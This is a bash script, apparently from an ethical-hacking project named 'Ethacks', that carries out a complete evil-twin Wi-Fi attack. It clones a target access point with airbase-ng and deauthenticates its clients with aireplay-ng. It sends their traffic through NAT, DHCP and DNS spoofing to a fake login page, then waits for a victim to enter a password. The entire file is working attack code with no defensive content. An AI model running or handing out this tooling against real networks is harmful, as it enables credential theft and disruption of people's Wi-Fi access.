#!/bin/bash

set -e
# Kill all background processes on exit
trap "trap - SIGTERM && kill -- -$$" SIGTERM EXIT

echo "Starting Ethacks Wifi-Spoofer"

BSSID=$1
CHANNEL=$2
ESSID=$3

AT_DEV="at0"

# Setup monitor mode
airmon-ng check kill
/etc/init.d/avahi-daemon stop
airmon-ng start wlan0

# Find an access point to attack
# Find a way to grab the output of this command and feed next command
# Optionally have 2 separate bash scripts

# If there's no command line args then we airodump to find a BSSID to spoof
if [ -z "$BSSID"  ] || [ -z "$CHANNEL"  ] || [ -z "$ESSID"  ]
then
	clear
	echo "No AP information provided. Starting airodump."
	echo "Please ctrl+c once you have found the desired BSSID, Channel, and ESSID to spoof."
	read -p "Press enter to continue"

	airodump-ng -a wlan0mon

	echo "Please enter the desired BSSID to spoof:"
	read BSSID
	echo "Please enter the channel:"
	read CHANNEL
	echo "Please enter the ESSID:"
	read ESSID
fi

# Spoof the chosen AP
airbase-ng -a "$BSSID" -c $CHANNEL -e "$ESSID" wlan0mon &
pid_airbase=$!
sleep 1
echo

# Allocate subnet mask
ifconfig $AT_DEV 10.0.0.1 up

# Enable NAT
iptables --flush
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface $AT_DEV -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Setup DHCP
#dnsmasq -C dnsmasq.conf -d &
dnsmasq -C dnsmasq.conf -dhR -p 0 &
pid_dnsmasq=$!
sleep 1
echo

# Start a webserver to host the fake auth page
# where portal/index.html is the fake login page
cd portal
python3 ../webserver.py &
pid_webserver=$!
cd ..
sleep 1
echo

# Deauth all clients
aireplay-ng --deauth 1 -a "$BSSID" wlan0mon
echo

# Redirect client to fake auth page
dnsspoof -i $AT_DEV &
pid_dnsspoof=$!
sleep 1
echo

echo "WiFi-Spoofer Ready!"

# Wait until user enters password
wait $pid_webserver

# Stop spoofing
kill $pid_dnsspoof
kill $pid_dnsmasq
kill $pid_airbase

